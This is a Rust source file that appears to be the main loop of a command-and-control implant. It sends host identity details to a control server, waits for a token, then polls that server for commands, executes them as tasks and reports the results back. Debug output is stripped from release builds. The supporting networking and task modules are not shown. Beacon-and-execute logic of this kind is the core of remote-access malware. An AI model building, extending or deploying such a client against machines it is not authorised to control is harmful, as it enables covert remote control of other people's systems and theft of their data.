extern crate core;

use std::{
    thread,
    time,
};

mod communication;
mod utils;

use crate::models::{
    Task
};


mod tasks;
mod models;

const POLL_SLEEP: time::Duration = time::Duration::from_secs(5);

/// Fetches commands from the control server and runs them, then returns task results to control
/// server
async fn call_home(token: &String) {
    let tasks: Vec<Task> = match communication::get_commands(token).await {
        Ok(val) => val,
        Err(_) => Vec::new(),
    };
    for t in tasks {
        #[cfg(debug_assertions)]
        println!("\nReceived task #{}: {}", t.id, t.name);
        tasks::run_task(t);
    }
    // Short sleep to ensure short running tasks are completed before checking, quick and dirty
    // solution
    thread::sleep(time::Duration::from_millis(200));

    let complete_tasks = tasks::check_completed();
    for tr in complete_tasks {
        match communication::send_task_result(&tr, token).await {
            Ok(_) => {
                #[cfg(debug_assertions)]
                println!("Successfully sent task #{} result to server", tr.id);
            }
            Err(_) => {
                #[cfg(debug_assertions)]
                println!("Failed send task #{} result to server!", tr.id);
            }
        };
    }
}

/// Initializes the client by sending ID characteristics to the control server.
/// Will poll the server until a authorization token is received
///
/// # Returns
/// The clients authorization token to be used on further requests to the control server.
async fn initialise_client() -> String {
    let mut token: String;
    loop {
        let id = utils::get_host_identify();
        token = match communication::send_identity(id).await {
            Ok(val) => val,
            Err(_) => String::from("")
        };

        if token != String::from("") {
            break;
        } else if cfg!(debug_assertions) {
            println!("Failed initialize");
        }
        thread::sleep(POLL_SLEEP);
    }
    #[cfg(debug_assertions)]
    println!("Client initialised");
    return token;
}

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    let token: String = initialise_client().await;
    let mut gets = 0;
    loop {
        call_home(&token).await;
        thread::sleep(POLL_SLEEP);

        // Remove break when the client is supposed to run forever
        if gets >= 1 {
            break;
        }
        gets += 1;
    }
    Ok(())
}
